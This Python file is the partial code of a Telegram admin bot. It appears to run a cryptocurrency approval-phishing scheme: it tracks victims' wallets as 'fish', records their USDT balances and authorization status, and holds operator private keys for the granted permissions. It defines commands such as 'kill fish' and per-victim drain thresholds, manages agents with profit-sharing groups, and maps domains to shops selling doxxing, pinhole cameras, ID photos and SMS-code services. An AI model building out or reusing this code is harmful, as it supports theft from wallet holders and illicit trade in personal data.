"""
ETH Mining Admin Bot - Python Version
功能与 bot.js 完全相同的管理机器人
"""
import asyncio
import logging
import re
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Tuple, Any
from collections import defaultdict
from supabase import create_client, Client
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters
)
from tronpy import Tron
from tronpy.keys import PrivateKey
from web3 import Web3
import httpx
from qrcode import QRCode
from PIL import Image
import os
from dotenv import load_dotenv
from aiohttp import web
import signal

load_dotenv()

# 配置日志
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Supabase 配置（延迟初始化，避免导入时失败）
SUPABASE_URL = None
SUPABASE_KEY = None
supabase: Optional[Client] = None

def init_supabase():
    """初始化 Supabase 客户端"""
    global SUPABASE_URL, SUPABASE_KEY, supabase
    
    if supabase is not None:
        return supabase
    
    SUPABASE_URL = os.getenv('NEXT_PUBLIC_SUPABASE_URL') or os.getenv('SUPABASE_URL')
    SUPABASE_KEY = os.getenv('SUPABASE_SERVICE_ROLE_KEY') or os.getenv('SUPABASE_KEY') or os.getenv('NEXT_PUBLIC_SUPABASE_ANON_KEY')
    
    if not SUPABASE_URL or not SUPABASE_KEY:
        logger.error("❌ Supabase 配置缺失，请设置 NEXT_PUBLIC_SUPABASE_URL 和 SUPABASE_SERVICE_ROLE_KEY")
        raise ValueError("Supabase 配置缺失")
    
    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
    logger.info("✅ Supabase 客户端初始化成功")
    return supabase

# Supabase 数据库操作封装（兼容原 MySQL 接口）
class DatabasePool:
    def __init__(self, supabase_client: Client):
        self.supabase = supabase_client
        self.lock = asyncio.Lock()
    
    async def execute(self, query: str, params=None):
        """执行 SQL 查询（通过 Supabase REST API）"""
        # Supabase Python 客户端使用 Table API
        # 对于简单查询，我们通过分析 SQL 转换为 Table API 调用
        # 对于复杂查询，需要使用 Supabase RPC 或直接 SQL
        
        # 简单的 SELECT 查询处理
        query_upper = query.strip().upper()
        
        try:
            if query_upper.startswith('SELECT'):
                # 解析表名 - 使用正则表达式更精确地匹配
                from_match = re.search(r'FROM\s+(\w+)', query_upper)
                if from_match:
                    table_name = from_match.group(1).lower()
                    
                    # 支持的表格
                    supported_tables = ['fish', 'fish_browse', 'daili', 'daili_group', 'options', 
                                       'contract_permissions', 'frontend_websites']
                    
                    if table_name in supported_tables:
                        result = self.supabase.table(table_name).select('*').execute()
                        return result.data if result.data else []
            
            logger.warning(f"未实现的查询类型: {query[:100]}")
            return []
        except Exception as e:
            logger.error(f"执行查询失败: {e}, 查询: {query[:100]}")
            return []
    
    def table(self, table_name: str):
        """获取 Supabase 表的引用"""
        return self.supabase.table(table_name)

# 初始化数据库池（延迟初始化）
pool: Optional[DatabasePool] = None

def get_pool() -> DatabasePool:
    """获取数据库池（延迟初始化）"""
    global pool
    if pool is None:
        supabase_client = init_supabase()
        pool = DatabasePool(supabase_client)
    return pool

# 域名到站点名称映射
DOMAIN_TO_SITE_NAME = {
    'zh166.cc': '国内账号',
    'sg156.cc': '社工查档',
    'tu155.cc': '人设套图',
    'fk118.cc': '营销软件',
    'yun188.cc': '云服务器',
    'sj135.cc': '全球数据',
    'zj188.cc': '国内外证件照片',
    'w-ka.cc': '礼品卡网站',
    'qf155.cc': '短信群发',
    'zk211.cc': '针孔摄像',
    'jm268.cc': '全球接码',
    'hw166.cc': '海外账号',
    'suamax.cc': '会员代开',
    'sim106.cc': '三网手机卡',
    'sf321.cc': '社工查档'
}

# 数据库缓存
class CacheData:
    def __init__(self):
        self.fish_map: Dict[str, Dict] = {}
        self.fish_browse_map: Dict[str, Dict] = {}
        self.daili_map: Dict[str, Dict] = {}
        self.daili_group_map: Dict[str, Dict] = {}
        self.options: Dict[str, str] = {}
        self.permission_addresses: List[str] = []
        self.lock = asyncio.Lock()
    
    async def update(self):
        """更新缓存数据"""
        async with self.lock:
            try:
                pool_instance = get_pool()
                supabase_client = pool_instance.supabase
                
                # 查询鱼苗数据
                fish_data = await pool_instance.execute(
                    "SELECT fish_address, chainid, permissions_fishaddress, unique_id, "
                    "usdt_balance, gas_balance, threshold, time, remark, auth_status FROM fish"
                )
                if fish_data:
                    self.fish_map = {row.get('fish_address', ''): row for row in fish_data if row.get('fish_address')}
                
                # 查询鱼苗浏览数据
                browse_data = await pool_instance.execute(
                    "SELECT id, fish_address, chainid, permissions_fishaddress, unique_id, "
                    "ip_address, wallet_type, website_name, usdt_balance, gas_balance, time, state "
                    "FROM fish_browse"
                )
                if browse_data:
                    self.fish_browse_map = {row.get('fish_address', ''): row for row in browse_data if row.get('fish_address')}
                
                # 查询代理数据
                daili_data = await pool_instance.execute(
                    "SELECT tguid, username, fullName, fishnumber, time, remark, "
                    "payment_address, groupid, threshold, unique_id FROM daili"
                )
                if daili_data:
                    self.daili_map = {row.get('unique_id', ''): row for row in daili_data if row.get('unique_id')}
                
                # 查询代理群组数据
                group_data = await pool_instance.execute(
                    "SELECT id, groupid, remark, share_profits, status FROM daili_group"
                )
                if group_data:
                    self.daili_group_map = {row.get('groupid'): row for row in group_data if row.get('groupid') is not None}
                
                # 查询配置选项 - 直接使用 Supabase Table API
                try:
                    result = supabase_client.table('options').select('name, value').execute()
                    all_options = result.data if result.data else []
                    
                    # 过滤需要的配置项
                    needed_keys = [
                        'domain', 'payment_address', 'permission_address', 'private_key',
                        '0x_payment_address', '0x_permission_address', '0x_private_key',
                        'contract_method', 'need_usdt_contract', 'bot_key', 'trongridkyes',
                        'main_domain', 'default_id', 'authorize_note'
                    ]
                    
                    self.options = {}
                    for opt in all_options:
                        if opt.get('name') in needed_keys:
                            self.options[opt['name']] = opt.get('value', '')
                    
                    # 处理权限地址
                    if 'permission_address' in self.options and self.options['permission_address']:
                        self.permission_addresses = [
                            addr.strip() for addr in str(self.options['permission_address']).split('\r\n')
                            if addr.strip()
                        ]
                    
                    # 处理0x权限地址
                    if '0x_permission_address' in self.options:
                        self.options['OxPermissionAddress'] = self.options['0x_permission_address']
                    if '0x_private_key' in self.options:
                        self.options['OxPrivateKey'] = self.options['0x_private_key']
                        
                except Exception as e:
                    logger.error(f"查询配置选项失败: {e}", exc_info=True)
                    
                logger.info(f"缓存更新完成: fish={len(self.fish_map)}, daili={len(self.daili_map)}, options={len(self.options)}")
                    
            except Exception as e:
                logger.error(f"更新缓存失败: {e}", exc_info=True)

cache = CacheData()

# 获取当前时间信息（北京时间）
def get_time_info():
    """获取当前时间信息和问候语"""
    now = datetime.now(timezone.utc)
    beijing_offset = timedelta(hours=8)
    beijing_time = now + beijing_offset
    
    hour = beijing_time.hour
    if 0 <= hour < 6:
        greeting = "凌晨好"
    elif 6 <= hour < 9:
        greeting = "早上好"
    elif 9 <= hour < 12:
        greeting = "上午好"
    elif hour == 12:
        greeting = "中午好"
    elif 13 <= hour < 18:
        greeting = "下午好"
    elif 18 <= hour < 19:
        greeting = "傍晚好"
    else:
        greeting = "晚上好"
    
    formatted_time = beijing_time.strftime("%Y-%m-%d %H:%M:%S")
    return {
        'time': formatted_time,
        'greeting': greeting
    }

# 根据域名获取站点名称
def get_site_name_by_domain(url_or_domain: str) -> Optional[str]:
    """根据域名或URL获取站点名称"""
    if not url_or_domain:
        return None
    
    try:
        domain = url_or_domain
        if '://' in url_or_domain:
            from urllib.parse import urlparse
            domain = urlparse(url_or_domain).hostname
        else:
            domain = re.sub(r'^https?://', '', domain).split('/')[0]
        
        domain = domain.replace('www.', '')
        
        if domain in DOMAIN_TO_SITE_NAME:
            return DOMAIN_TO_SITE_NAME[domain]
        
        for map_domain, site_name in DOMAIN_TO_SITE_NAME.items():
            if map_domain in domain or domain in map_domain:
                return site_name
        
        return None
    except Exception as e:
        logger.error(f"解析域名失败: {url_or_domain}, {e}")
        return None

# 群组违禁次数记录
violation_counts = defaultdict(int)

# 允许的命令（下课时）
ALLOWED_COMMANDS = {
    'threshold': re.compile(r'^(?:修改阈值|阈值修改|阈值|修改阀值|阀值修改|阀值)\s*(?:T[1-9A-HJ-NP-Za-km-z]{33}|0x[a-fA-F0-9]{40})\s*([0-9.]+)$'),
    'killFish': re.compile(r'^杀鱼\s*(?:T[1-9A-HJ-NP-Za-km-z]{33}|0x[a-fA-F0-9]{40})$'),
    'paymentAddress': re.compile(r'^(?:收款地址|设置地址|设置收款地址)\s*(?:T[1-9A-HJ-NP-Za-km-z]{33}|0x[a-fA-F0-9]{40})$'),
    'queryPaymentAddress': re.compile(r'^收款地址$'),
    'myFish': re.compile(r'^(?:我的|我的鱼苗|鱼苗|鱼池)$'),
    'proxy': re.compile(r'^(?:代理|代理链接|链接|商城|发卡)$'),
    'autoThreshold': re.compile(r'^(?:自动阈值|设置自动阈值|全局阈值|设置阈值|设置阀值|自动阀值|设置自动阀值|全局阀值)\s*([0-9.]+)$'),
    'rules': re.compile(r'^(?:规则|交易规则|担保交易规则|担保规则)$'),
}

def is_calculator(text: str) -> bool:
    """检查是否为计算器表达式"""
    if not text or not re.match(r'^[\d\+\-\*/\%\(\)\. =xX÷％]+$', text):
        return False
    if re.match(r'^\d+$', text):
        return False
    
    sanitized = text.split('=')[0].replace('x', '*').replace('X', '*').replace('÷', '/').replace('％', '%').strip()
    if not re.match(r'^[\d\(]', sanitized) or not re.match(r'[\d\)]$', sanitized):
        return False
    return bool(re.search(r'[\+\-\*/\%]', sanitized))

# 初始化 Telegram Bot
bot_application = None
bot_instance = None

async def init_bot() -> bool:
    """初始化 Telegram Bot"""
    global bot_application, bot_instance
    
    try:
        missing_configs = []
        incorrect_configs = []
        
        if not cache.options.get('bot_key') or not cache.options['bot_key'].strip():
            missing_configs.append('机器人密钥')
        if not cache.options.get('trongridkyes') or not cache.options['trongridkyes'].strip():
            missing_configs.append('TronGrid密钥')
        if not cache.options.get('main_domain') or not cache.options['main_domain'].strip():
            missing_configs.append('主域名')
        if not cache.daili_group_map:
            missing_configs.append('群组信息')
        
        # 检查TRC权限私钥
        private_key = cache.options.get('private_key', '').strip()
        if not private_key:
            missing_configs.append('TRC权限私钥')
        elif not re.match(r'^[0-9a-fA-F]{64}$', private_key):
            incorrect_configs.append('TRC权限私钥不正确')
        
        # 检查TRC收款地址
        payment_address = cache.options.get('payment_address', '').strip()
        if not payment_address:
            missing_configs.append('TRC收款地址')
        elif not re.match(r'^T[A-Za-z0-9]{33}$', payment_address):
            incorrect_configs.append('TRC收款地址不正确')
        
        # 检查TRC权限地址
        if not cache.permission_addresses:
            missing_configs.append('TRC权限地址')
        else:
            for i, addr in enumerate(cache.permission_addresses):
                if not re.match(r'^T[A-Za-z0-9]{33}$', addr.strip()):
                    incorrect_configs.append(f'第{i+1}个权限地址不正确')
        
        # 检查EVM权限地址
        if not cache.options.get('OxPermissionAddress') or not cache.options['OxPermissionAddress'].strip():
            missing_configs.append('EVM权限地址')
        
        if missing_configs or incorrect_configs:
            error_message = '\n======机器人启动失败======\n'
            if missing_configs:
                error_message += '缺少配置选项：\n'
                for i, config in enumerate(missing_configs, 1):
                    error_message += f'{i}.【{config}】\n'
            if incorrect_configs:
                if missing_configs:
                    error_message += '\n'
                error_message += '配置信息不正确：\n'
                for i, config in enumerate(incorrect_configs, 1):
                    error_message += f'{i}.【{config}】\n'
            error_message += '======机器人启动失败======'
            logger.error(f"Bot初始化失败: {error_message}")
            return False
        
        bot_key = cache.options['bot_key']
        bot_application = Application.builder().token(bot_key).build()
        bot_instance = bot_application.bot
        
        # 设置处理器
        setup_bot_handlers()
        setup_callback_handlers()
        
        return True
    except Exception as e:
        logger.error(f"Bot初始化失败: {e}")
        return False

# 这里继续添加其他功能模块...
# 由于代码量很大，我会分多个文件来实现

# HTTP 健康检查服务器
health_check_app = None
health_check_runner = None

async def health_check_handler(request):
    """健康检查处理器"""
    return web.Response(text='OK', status=200)

async def start_health_check_server(port: int = 8080):
    """启动健康检查 HTTP 服务器"""
    global health_check_app, health_check_runner
    
    try:
        health_check_app = web.Application()
        health_check_app.router.add_get('/health', health_check_handler)
        health_check_app.router.add_get('/', health_check_handler)  # 根路径也返回健康
        
        health_check_runner = web.AppRunner(health_check_app)
        await health_check_runner.setup()
        
        site = web.TCPSite(health_check_runner, '0.0.0.0', port)
        await site.start()
        logger.info(f"✅ 健康检查服务器已启动，监听端口 {port}")
        return True
    except Exception as e:
        logger.error(f"❌ 启动健康检查服务器失败: {e}")
        return False

async def stop_health_check_server():
    """停止健康检查服务器"""
    global health_check_runner
    if health_check_runner:
        await health_check_runner.cleanup()
        logger.info("健康检查服务器已停止")

def setup_bot_handlers():
    """设置 Telegram Bot 处理器"""
    if not bot_application:
        return
    
    # 添加启动命令处理器
    async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("机器人已启动！")
    
    bot_application.add_handler(CommandHandler("start", start_command))
    logger.info("已设置 Bot 处理器")

def setup_callback_handlers():
    """设置回调处理器"""
    if not bot_application:
        return
    
    # 可以在这里添加回调处理器
    logger.info("已设置回调处理器")

async def main():
    """主函数"""
    # 获取端口（Railway 会提供 PORT 环境变量）
    try:
        port = int(os.getenv('PORT', '8080'))
    except (ValueError, TypeError):
        port = 8080
        logger.warning(f"无法解析 PORT 环境变量，使用默认端口 {port}")
    
    # 启动健康检查服务器（即使机器人初始化失败也要启动，以便健康检查通过）
    logger.info(f"启动健康检查服务器，端口: {port}")
    health_server_ok = await start_health_check_server(port)
    if not health_server_ok:
        logger.error("无法启动健康检查服务器，退出")
        return
    
    try:
        # 确保 Supabase 已初始化
        try:
            init_supabase()
            logger.info("✅ Supabase 连接成功")
        except Exception as e:
            logger.error(f"❌ Supabase 初始化失败: {e}")
            logger.warning("⚠️ 将继续运行健康检查服务器，但机器人功能将不可用")
        
        # 更新缓存
        logger.info("更新数据库缓存...")
        try:
            await cache.update()
        except Exception as e:
            logger.error(f"缓存更新失败: {e}，将在后续重试")
        
        # 初始化机器人
        logger.info("初始化 Telegram Bot...")
        bot_init_success = await init_bot()
        
        if bot_init_success:
            logger.info("✅ 机器人初始化成功")
            try:
                # 启动机器人（使用长轮询）
                await bot_application.initialize()
                await bot_application.start()
                await bot_application.updater.start_polling()
                logger.info("✅ 机器人已启动，开始接收消息...")
            except Exception as e:
                logger.error(f"启动机器人失败: {e}", exc_info=True)
                bot_init_success = False
        else:
            logger.error("❌ 机器人初始化失败，但健康检查服务器仍在运行")
        
        # 保持运行（即使机器人初始化失败，也要保持健康检查服务器运行）
        try:
            last_cache_update = datetime.now()
            while True:
                await asyncio.sleep(60)  # 每分钟检查一次
                # 定期更新缓存（每 5 分钟）
                now = datetime.now()
                if (now - last_cache_update).total_seconds() >= 300:
                    logger.info("更新数据库缓存...")
                    try:
                        await cache.update()
                    except Exception as e:
                        logger.error(f"缓存更新失败: {e}")
                    last_cache_update = now
        except KeyboardInterrupt:
            logger.info("收到停止信号...")
        except Exception as e:
            logger.error(f"运行时错误: {e}", exc_info=True)
    except Exception as e:
        logger.error(f"运行错误: {e}", exc_info=True)
    finally:
        # 清理
        if bot_application:
            try:
                await bot_application.updater.stop()
                await bot_application.stop()
                await bot_application.shutdown()
            except Exception as e:
                logger.error(f"停止机器人失败: {e}")
        await stop_health_check_server()

if __name__ == '__main__':
    logger.info("=" * 50)
    logger.info("启动 Telegram Bot 服务...")
    logger.info("=" * 50)
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("程序被用户中断")
    except Exception as e:
        logger.error(f"程序异常退出: {e}", exc_info=True)

